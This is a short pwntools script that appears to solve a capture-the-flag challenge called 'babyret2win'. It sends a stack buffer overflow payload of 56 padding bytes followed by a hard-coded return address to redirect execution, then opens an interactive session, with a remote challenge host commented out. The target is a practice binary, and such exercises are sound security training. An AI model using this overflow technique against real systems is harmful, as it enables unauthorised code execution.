from pwn import *

p = process("./babyret2win")
# p = remote("7a3d0eb.678470.xyz", 30764)

p.sendline(b"\b")
p.sendline(b"\b")
p.sendline(b"\b")
p.sendline(b"\b")

p.recvuntil(b"name?\n")
padding = 56

payload = b"A" * padding + p64(0x00000000004011d6)

print(payload)
p.sendline(payload)
p.interactive()